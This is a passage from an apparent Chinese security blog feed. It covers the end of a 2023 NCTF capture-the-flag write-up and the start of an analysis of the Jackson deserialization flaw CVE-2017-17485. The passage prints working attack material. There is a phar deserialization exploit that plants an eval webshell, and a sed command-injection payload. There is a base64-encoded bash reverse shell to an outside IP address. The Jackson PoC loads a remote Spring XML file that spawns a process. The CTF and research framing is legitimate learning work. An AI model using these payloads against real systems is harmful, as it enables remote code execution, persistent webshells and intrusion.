Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,ja;q=0.5,zh-TW;q=0.4,no;q=0.3,ko;q=0.2</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>aiovg_rand_seed=1541956646</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>构造 phar 的 EXP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="title class_">class</span> <span class="title class_">WP_HTML_Token</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="title class_">public</span> $<span class="title class_">bookmark_name</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$on_destroy</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$bookmark_name</span>, <span class="variable">$on_destroy</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;bookmark_name = <span class="variable">$bookmark_name</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;on_destroy = <span class="variable">$on_destroy</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">\WP_HTML_Token</span>(<span class="string">&#x27;echo \&#x27;&lt;?php @eval($_POST[&quot;nepnb&quot;]);?&gt;\&#x27; &gt; /var/www/html/nepnep.php&#x27;</span>, <span class="string">&#x27;system&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> =<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89A&lt;?php XXX __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后不论是文件上传还是 phar 生成，都踩了不少坑。</p><p>最后连上 shell 之后需要 suid 提权</p><img src="/2023/12/27/2023-NCTF-WP/suid.png" class><p>date suid </p><p>date -f 文件名</p><img src="/2023/12/27/2023-NCTF-WP/flag2.png" class><h2 id="wait-what"><a href="#wait-what" class="headerlink" title="wait what"></a>wait what</h2><p>做的时候就感觉是某种特性，看到 in 的时候感觉问题挺大的</p><img src="/2023/12/27/2023-NCTF-WP/in.png" class><p>搜了一下相关的特性 <a class="link" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/in">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/in<i class="fas fa-external-link-alt"></i></a></p><blockquote><p>如果指定的属性在指定的对象或其原型链中，则 <strong><code>in</code></strong> <strong>运算符</strong>返回 <code>true</code>。</p></blockquote><p>本地测试一下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> banned_users = [<span class="string">&#x27;hacker&#x27;</span>]</span><br><span class="line"></span><br><span class="line">banned_users.<span class="title function_">push</span>(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line"></span><br><span class="line">username=<span class="string">&#x27;admin&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> test2 = (username <span class="keyword">in</span> banned_users)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`使用in关键字匹配<span class="subst">$&#123;username&#125;</span>的结果为：<span class="subst">$&#123;test2&#125;</span>`</span>)</span><br><span class="line">    <span class="keyword">if</span> (test2) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;第二个判断匹配到封禁用户：&quot;</span>,username)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当 username &#x3D; ‘admin’ 时，返回 false，当 username &#x3D; ‘0’ 时，返回 true</p><p>由于 banned_users 为 Array 类型，不存在 admin 属性，因此 test2 实际上判断的是banned_users 中是否存在数组索引为 username 的值（由于对象的属性名称会被隐式转换为字符串，”0” 和 0 都可以作为数组索引）</p><p>这里过了第一步之后还有一步正则的过滤，比较明显的是 test 函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> test1 = banned_users_regex.<span class="title function_">test</span>(username)</span><br></pre></td></tr></table></figure><blockquote><p>test() 方法用于检测一个字符串是否匹配某个模式.</p></blockquote><p>由于 <code>new RegExp(regex_string, &quot;g&quot;)</code> 定义了 g 的全局标志</p><p>如果正则表达式设置了全局标志， <code>test()</code> 的执⾏会改变正则表达式 lastIndex 属性。连续地执⾏ <code>test()</code> ⽅法，后续的执⾏将会从 lastIndex 处开始匹配字符串</p><ul><li>example</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> &gt; <span class="keyword">let</span> r = <span class="regexp">/^admin$/g</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span> &gt; r.<span class="property">lastIndex</span></span><br><span class="line"><span class="number">4</span> <span class="number">0</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">6</span> &gt; r.<span class="title function_">test</span>(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line"><span class="number">7</span> <span class="literal">true</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">9</span> &gt; r.<span class="property">lastIndex</span></span><br><span class="line"><span class="number">10</span> <span class="number">5</span></span><br><span class="line"><span class="number">11</span></span><br><span class="line"><span class="number">12</span> r.<span class="title function_">test</span>(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line"><span class="number">13</span> <span class="literal">false</span></span><br><span class="line"><span class="number">14</span></span><br><span class="line"><span class="number">15</span> &gt; r.<span class="property">lastIndex</span></span><br><span class="line"><span class="number">16</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><p>那么这里的攻击思路是什么呢，总结一下应该是想办法让 admin 这个用户的 lastIndex 被我们恶意修改为 <code>admin.length</code>。攻击分为两步走</p><p>1、访问 <code>/api/ban_user</code> 路由，构造数组传入，绕过 <code>in</code> 的过滤<br>2、访问 <code>/api/flag</code>，发两次包，就能够让 <code>r.lastIndex</code> 变成 <code>admin.length</code>，绕过 waf</p><p>但是这里实施起来还是有个问题，下面这段代码每次在请求时都会创建⼀个新的 <code>banned_users_regex</code> ，恢复其 lastIndex 位置为初始值 0</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="title function_">build_banned_users_regex</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;封禁用户正则表达式（满足这个正则表达式的用户名为被封禁用户名）：&quot;</span>,banned_users_regex)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这里的绕过挺巧妙的，又用到了一个特性</p><p>现如果传⼊ <code>escapeRegExp(string)</code> 函数中的 string 参数为⾮字符串类型，则 string 不存在 replace 属性，会抛出TypeError，如此来绕过 regex 的更新</p><p>如此一来，最后的 EXP 就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">remote_addr=<span class="string">&quot;http://127.0.0.1&quot;</span></span><br><span class="line"></span><br><span class="line">rs = requests.Session()</span><br><span class="line"></span><br><span class="line">resp = rs.post(remote_addr+<span class="string">&quot;/api/register&quot;</span>,json=</span><br><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;test&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line">resp = rs.post(remote_addr+<span class="string">&quot;/api/ban_user&quot;</span>,json=</span><br><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="string">&quot;ban_username&quot;</span>:&#123;<span class="string">&quot;toString&quot;</span>:<span class="string">&quot;&quot;</span>&#125;&#125;)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line">resp = rs.post(remote_addr+<span class="string">&quot;/api/flag&quot;</span>,json=</span><br><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line">resp = rs.post(remote_addr+<span class="string">&quot;/api/flag&quot;</span>,json=</span><br><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure><img src="/2023/12/27/2023-NCTF-WP/flag3.png" class><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>虽然理解了特性，不过我个人觉得不调试一下是很不清晰的，所以就又调试了一遍。</p><p>先来看第一遍发包的时候，传数组，确实能够看到抛出异常，导致 <code>lastIndex</code> 不会被重置。</p><img src="/2023/12/27/2023-NCTF-WP/debug1.png" class><p>接着去请求 <code>/api/flag</code>，去修改 <code>lastIndex</code>，第一次的时候，由于 <code>lastIndex</code> 还是 0，匹配 admin 为 true</p><img src="/2023/12/27/2023-NCTF-WP/index0.png" class><p>当第二次再发起请求的时候</p><img src="/2023/12/27/2023-NCTF-WP/index5.png" class><p>成功 bypass 了</p><h2 id="Webshell-Generator"><a href="#Webshell-Generator" class="headerlink" title="Webshell Generator"></a>Webshell Generator</h2><p>最开始 download.php 是有任意文件读取的，不能直接读 flag，需要执行 <code>/readflag</code>，所以需要 rce 的。核心聚焦于这一个文件上，generate.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"></span><br><span class="line">NEW_FILENAME=$(<span class="built_in">tr</span> -dc a-z0-9 &lt;/dev/urandom | <span class="built_in">head</span> -c 16)</span><br><span class="line"><span class="built_in">cp</span> template.php <span class="string">&quot;/tmp/<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&quot;s/KEY/<span class="variable">$KEY</span>/g&quot;</span> <span class="string">&quot;<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br><span class="line">sed -i <span class="string">&quot;s/METHOD/<span class="variable">$METHOD</span>/g&quot;</span> <span class="string">&quot;<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">realpath</span> <span class="string">&quot;<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br></pre></td></tr></table></figure><p>sed -i 命令用于在文件中直接修改文本内容，而不是将输出打印到标准输出。使用该命令可以在不创建临时文件的情况下，直接修改原始文件的内容。</p><p>这里的 sed -i 的最终效果是修改 template.php 中的任意一个变量。</p><p>来看一下 <code>sed</code> 命令的官方文档</p><p><a class="link" href="https://www.gnu.org/software/sed/manual/">https://www.gnu.org/software/sed/manual/<i class="fas fa-external-link-alt"></i></a></p><p>GNU sed 可以通过 e 指令执⾏系统命令。闭合原先的s指令，执⾏ <code>/readflag</code>，会将 flag 插⼊到输出⽂件的第⼀⾏。⾃动跳转到 download.php 读取即可。</p><p>由此能够构造出的 payload 是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/g;1e /readflag;s</span><br></pre></td></tr></table></figure><img src="/2023/12/27/2023-NCTF-WP/readflag.png" class><p>拿到 flag</p><img src="/2023/12/27/2023-NCTF-WP/flag4.png" class><p>反弹 shell 也是可以的（但是我复现失败了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">resp = requests.post(<span class="string">&quot;http://117.50.175.234:8001/index.php&quot;</span>,data=</span><br><span class="line">&#123;<span class="string">&quot;language&quot;</span>:<span class="string">&quot;PHP&quot;</span>,<span class="string">&quot;key&quot;</span>:<span class="string">&#x27;&#x27;&#x27;/g; 1e bash -c &quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIyLjIxLjEzOC8zMzMzIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; #s//&#x27;&#x27;&#x27;</span>,<span class="string">&quot;method&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;filename&quot;</span>:<span class="string">&quot;2&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(resp.status_code,resp.text)</span><br></pre></td></tr></table></figure><h2 id="EvilMQ"><a href="#EvilMQ" class="headerlink" title="EvilMQ"></a>EvilMQ</h2><p>有空再复现，最近太忙了。</p><p>想结合 QL 来看看，感觉上有可能成为一个新的攻击面。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>总结一下，是很用心的比赛，出题质量很高</p>]]></content>
    
    
    <summary type="html">2023 NCTF WP</summary>
    
    
    
    <category term="WP" scheme="https://drun1baby.github.io/categories/WP/"/>
    
    
    <category term="WP" scheme="https://drun1baby.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>Jackson 反序列化（三）CVE-2017-17485</title>
    <link href="https://drun1baby.github.io/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/"/>
    <id>https://drun1baby.github.io/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/</id>
    <published>2023-12-07T12:06:09.000Z</published>
    <updated>2023-12-07T12:41:05.752Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>本次 Jackson 反序列化漏洞是基于 <code>org.springframework.context.support.ClassPathXmlApplicationContext</code><br>的利用链的。在开启 <code>enableDefaultTyping()</code>  或使用有问题的 <code>@JsonTypeInfo</code> 注解的前提下</p><p>可以通过 jackson-databind 来滥用 Spring 的 SpEL 表达式注入漏洞来触发 Jackson 反序列化漏洞的，从而达到任意命令执行的效果。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Jackson 2.7系列 &lt; 2.7.9.2<br>Jackson 2.8系列 &lt; 2.8.11<br>Jackson 2.9系列 &lt; 2.9.4</p><h3 id="利用限制"><a href="#利用限制" class="headerlink" title="利用限制"></a>利用限制</h3><p>需要额外的 jar 包，并非完全的 Jackson 漏洞</p><p>环境所用的 <strong>pom.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.0.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-beans<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.0.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.0.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-expression<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.0.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><p><code>ClassPathXmlApplicationContext</code> 这个类是用来加载一些 XML 资源的，而最后的攻击实现也是如此</p><p><strong>PoC.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PoC</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  &#123;  </span><br><span class="line">        <span class="comment">//CVE-2017-17485  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;[\&quot;org.springframework.context.support.ClassPathXmlApplicationContext\&quot;, \&quot;http://127.0.0.1:8888/spel.xml\&quot;]&quot;</span>;  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        mapper.enableDefaultTyping();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            mapper.readValue(payload, Object.class);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>spel.xml，放置在第三方 Web 服务中，看到 id 为 pb 的 bean 标签，指定了类为 <code>java.lang.ProcessBuilder</code>，在其中有两个子标签，<code>constructor-arg</code> 标签设置参数值为具体的命令，property 标签调用 <code>start()</code> 方法：</p><p><strong>spel.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span>  </span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>  </span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;  </span></span></span><br><span class="line"><span class="string"><span class="tag">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">&quot;calc&quot;</span> /&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;whatever&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123; pb.start() &#125;&quot;</span>/&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>成功命令执行</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/calc.png" class><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><p>这里的 XML 内容解析，到 SpEL 表达式注入，其实是涉及到 Spring 的 IOC 原则，简单来过一遍。</p><p>前面 Jackson 的反序列化解析部分就不看了，直接到 Jackson 调用 <code>ClassPathXmlApplicationContext</code> 的构造函数。在 <code>ClassPathXmlApplicationContext</code> 